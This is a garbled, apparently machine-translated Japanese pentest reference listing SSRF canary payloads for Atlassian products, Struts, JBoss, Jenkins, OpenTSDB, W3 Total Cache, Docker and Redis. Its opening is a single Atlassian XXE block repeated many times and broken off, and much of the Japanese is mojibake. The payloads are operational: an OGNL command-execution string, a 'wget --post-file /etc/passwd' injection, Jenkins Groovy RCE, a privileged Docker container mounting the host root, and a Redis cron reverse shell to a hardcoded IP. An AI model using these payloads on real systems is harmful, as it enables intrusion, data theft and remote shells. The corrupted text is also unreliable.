- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```
# Apache Struts

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80,443 (SSL),8080,8443 (SSL)**

[ã“ã“](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)ã‹ã‚‰å¼•ç”¨ã€‚

**SSRF ã‚«ãƒŠãƒªã‚¢: Struts2-016**:

æ—¢çŸ¥ã®ã™ã¹ã¦ã®å†…éƒ¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ/URLã®æœ«å°¾ã«ã“ã‚Œã‚’è¿½åŠ ã—ã¦ãã ã•ã„:
```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
# JBoss

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80,443 (SSL),8080,8443 (SSL)**

[ã“ã“ã‹ã‚‰å–å¾—](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF ã‚«ãƒŠãƒªã‚¢: URL ã‹ã‚‰ WAR ã‚’ãƒ‡ãƒ—ãƒ­ã‚¤ã™ã‚‹**
```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```
# Confluence

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80,443 (SSL),8080,8443 (SSL)**

**SSRF ã‚«ãƒŠãƒªã‚¢: Sharelinks (2016å¹´11æœˆä»¥å‰ã«ãƒªãƒªãƒ¼ã‚¹ã•ã‚ŒãŸConfluenceã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³)**
```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```
**SSRF Canary: iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
# Jira

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80,443 (SSL),8080,8443 (SSL)**

**SSRF ã‚«ãƒŠãƒªã‚¢: iconUriServlet - Jira < 7.3.5 (CVE-2017-9506)**

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
**SSRF Canary: makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Atlassian Security Ticket JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```
# ãã®ä»–ã®Atlassianè£½å“

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80ã€443 (SSL)ã€8080ã€8443 (SSL)**

**SSRFã‚­ãƒ£ãƒŠãƒªãƒ¼: iconUriServlet (CVE-2017-9506)**:

* Bamboo < 6.0.0
* Bitbucket < 4.14.4
* Crowd < 2.11.2
* Crucible < 4.3.2
* Fisheye < 4.3.2

[Atlassianã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚±ãƒƒãƒˆOAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
# OpenTSDB

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 4242**

[OpenTSDBãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRFã‚­ãƒ£ãƒŠãƒªãƒ¼: RCEçµŒç”±ã®curl**
```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```
[OpenTSDB 2.4.0 ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF ã‚«ãƒŠãƒªã‚¢: RCE çµŒç”±ã® curl - CVE-2020-35476**
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```
# Jenkins

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80,443 (SSL),8080,8888**

[ã“ã¡ã‚‰](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)ã«ç´ æ™´ã‚‰ã—ã„è§£èª¬ãŒã‚ã‚Šã¾ã™ã€‚

**SSRF ã‚«ãƒŠãƒªã‚¢: CVE-2018-1000600**
```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```
**RCE**

RCEï¼ˆãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼‰ã‚’é”æˆã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®æ‰‹é †ã«å¾“ã£ã¦ãã ã•ã„ï¼š[Jenkinsã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ‘ãƒ¼ãƒˆ2 - èªè¨¼ãªã—ã®RCEã®ãŸã‚ã®ãƒ¡ã‚¿ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°ã®æ‚ªç”¨](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```
**Groovyã‚’ä»‹ã—ãŸRCEï¼ˆãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼‰**

```html
## Description
This vulnerability allows an attacker to execute arbitrary code on the server by exploiting a Server-Side Request Forgery (SSRF) vulnerability in a web application that uses Groovy.

## Exploitation
1. Identify the SSRF vulnerability in the target web application.
2. Craft a malicious request that includes a Groovy script payload.
3. Send the malicious request to the server.
4. The server, due to the SSRF vulnerability, will execute the Groovy script payload.
5. The attacker can now execute arbitrary code on the server.

## Mitigation
To mitigate this vulnerability, follow these steps:
1. Implement proper input validation and sanitization to prevent SSRF vulnerabilities.
2. Use a whitelist approach to validate and restrict the allowed URLs for outgoing requests.
3. Avoid passing user-controlled input directly to the Groovy interpreter.
4. Regularly update and patch the Groovy interpreter to ensure the latest security fixes are applied.
```

## èª¬æ˜
ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€Groovyã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®Server-Side Request Forgeryï¼ˆSSRFï¼‰è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## æ‚ªç”¨æ–¹æ³•
1. ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§SSRFè„†å¼±æ€§ã‚’ç‰¹å®šã—ã¾ã™ã€‚
2. Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€æ‚ªæ„ã®ã‚ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚
3. æ‚ªæ„ã®ã‚ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã—ã¾ã™ã€‚
4. SSRFè„†å¼±æ€§ã«ã‚ˆã‚Šã€ã‚µãƒ¼ãƒãƒ¼ã¯Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
5. æ”»æ’ƒè€…ã¯ä»Šã‚„ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

## ç·©å’Œç­–
ã“ã®è„†å¼±æ€§ã‚’ç·©å’Œã™ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã«å¾“ã£ã¦ãã ã•ã„ï¼š
1. SSRFè„†å¼±æ€§ã‚’é˜²ããŸã‚ã«ã€é©åˆ‡ãªå…¥åŠ›æ¤œè¨¼ã¨ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã‚’å®Ÿè£…ã—ã¾ã™ã€‚
2. å‡ºåŠ›ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®è¨±å¯ã•ã‚ŒãŸURLã‚’æ¤œè¨¼ãŠã‚ˆã³åˆ¶é™ã™ã‚‹ãŸã‚ã«ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
3. ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒåˆ¶å¾¡å¯èƒ½ãªå…¥åŠ›ã‚’ç›´æ¥Groovyã‚¤ãƒ³ã‚¿ãƒ—ãƒªã‚¿ã«æ¸¡ã•ãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚
4. æœ€æ–°ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¿®æ­£ãŒé©ç”¨ã•ã‚Œã‚‹ã‚ˆã†ã«ã€å®šæœŸçš„ã«Groovyã‚¤ãƒ³ã‚¿ãƒ—ãƒªã‚¿ã‚’æ›´æ–°ãŠã‚ˆã³ãƒ‘ãƒƒãƒã—ã¾ã™ã€‚
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```
# Hystrix ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80,443 (SSL),8080**

Spring Cloud Netflixã€ãƒãƒ¼ã‚¸ãƒ§ãƒ³2.2.xã®2.2.4ã‚ˆã‚Šå‰ã€ãƒãƒ¼ã‚¸ãƒ§ãƒ³2.1.xã®2.1.6ã‚ˆã‚Šå‰ã€‚

**SSRF ã‚«ãƒŠãƒªã‚¢: CVE-2020-5412**
```bash
/proxy.stream?origin=http://SSRF_CANARY/
```
# W3 Total Cache

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80,443 (SSL)**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF ã‚«ãƒŠãƒªã‚¢: CVE-2019-6715**

ã“ã‚Œã¯ PUT ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:
```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```
**SSRF Canary**

ã“ã®è„†å¼±æ€§ã®ã‚¢ãƒ‰ãƒã‚¤ã‚¶ãƒªã¯ã“ã¡ã‚‰ã§å…¬é–‹ã•ã‚Œã¦ã„ã¾ã™: [W3 Total Cache SSRF vulnerability](https://klikki.fi/adv/w3\_total\_cache.html)

ã“ã®PHPã‚³ãƒ¼ãƒ‰ã¯ã€SSRF Canaryãƒ›ã‚¹ãƒˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã—ã¾ã™ï¼ˆ`url`ã‚’è‡ªåˆ†ã®Canaryãƒ›ã‚¹ãƒˆã«ç½®ãæ›ãˆã¦ãã ã•ã„ï¼‰:
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```
# Docker

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 2375ã€2376 (SSL)**

éƒ¨åˆ†çš„ã«ç›²ç›®çš„ãªSSRFã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€æ¬¡ã®ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¦Dockerã®APIã®å­˜åœ¨ã‚’ç¢ºèªã§ãã¾ã™:
```bash
/containers/json
/secrets
/services
```
**ä»»æ„ã®Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹RCE**

ã“ã®æ”»æ’ƒæ‰‹æ³•ã§ã¯ã€SSRFã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦ã€ä»»æ„ã®Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼ˆRCEï¼‰ã‚’é”æˆã—ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€SSRFè„†å¼±æ€§ã‚’æŒã¤ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦ã€ç‰¹å®šã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã¯ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã®URLãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ã“ã®URLã‚’ä½¿ç”¨ã—ã¦Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€å®Ÿè¡Œã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚€Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ä½œæˆã—ã€ãã‚Œã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ã«å¯¾ã—ã¦ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æ”»æ’ƒæ‰‹æ³•ã¯ã€Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã®å®Ÿè¡Œã«é–¢ã™ã‚‹é©åˆ‡ãªåˆ¶é™ãŒãªã„å ´åˆã«æˆåŠŸã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã¨ã—ã¦ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ã§Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã®å®Ÿè¡Œã‚’åˆ¶é™ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```
alpineã‚’ã€Dockerã‚³ãƒ³ãƒ†ãƒŠã§å®Ÿè¡Œã—ãŸã„ä»»æ„ã®ã‚¤ãƒ¡ãƒ¼ã‚¸ã«ç½®ãæ›ãˆã¦ãã ã•ã„ã€‚

# Gitlab Prometheus Redis Exporter

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 9121**

ã“ã®è„†å¼±æ€§ã¯ã€Gitlabã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³13.1.1ã‚ˆã‚Šå‰ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆã¾ã™ã€‚[Gitlabã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus)ã«ã‚ˆã‚‹ã¨ã€ã€ŒPrometheusã¨ãã®ã‚¨ã‚¯ã‚¹ãƒãƒ¼ã‚¿ãƒ¼ã¯ã€GitLab 9.0ä»¥é™ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœ‰åŠ¹ã«ãªã£ã¦ã„ã¾ã™ã€‚ã€

ã“ã‚Œã‚‰ã®ã‚¨ã‚¯ã‚¹ãƒãƒ¼ã‚¿ãƒ¼ã¯ã€æ”»æ’ƒè€…ãŒCVE-2020-13379ã‚’ä½¿ç”¨ã—ã¦ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã«å¯¾ã—ã¦æ”»æ’ƒã‚’è¡Œã†ãŸã‚ã®å„ªã‚ŒãŸæ‰‹æ®µã‚’æä¾›ã—ã¾ã™ã€‚å®¹æ˜“ã«æ‚ªç”¨ã§ãã‚‹ã‚¨ã‚¯ã‚¹ãƒãƒ¼ã‚¿ãƒ¼ã®1ã¤ã¯Redis Exporterã§ã™ã€‚

ä»¥ä¸‹ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ã€targetãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã‚’ä»‹ã—ã¦æä¾›ã•ã‚Œã‚‹Redisã‚µãƒ¼ãƒãƒ¼ã®ã™ã¹ã¦ã®ã‚­ãƒ¼ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ã‚’æ”»æ’ƒè€…ã«è¨±å¯ã—ã¾ã™ï¼š
```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```
***

**Gopherã‚’ä»‹ã—ã¦å¯èƒ½**

# Redis

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 6379**

ãŠã™ã™ã‚ã®èª­ã¿ç‰©:

* [HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä»‹ã—ãŸRedisã®ãƒãƒƒã‚¯ã®è©¦ã¿](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)
* [Redisã«å¯¾ã™ã‚‹SSRFæ”»æ’ƒ](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**Cronã‚’ä»‹ã—ãŸRCE** - [Gopheræ”»æ’ƒã®å¯¾è±¡](https://blog.chaitin.cn/gopher-attack-surfaces/)
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```
Gopher:

Gopherã¯ã€SSRFï¼ˆã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼‰ã®è„†å¼±ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®1ã¤ã§ã™ã€‚Gopherã¯ã€URLã‚¹ã‚­ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã€SSRFæ”»æ’ƒã®æ¨™çš„ã«ãªã‚Šã‚„ã™ã„ã§ã™ã€‚Gopherãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯ã€Gopherã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã—ã¦ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒªã‚¹ãƒˆã‚„ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚SSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€Gopherã‚¹ã‚­ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

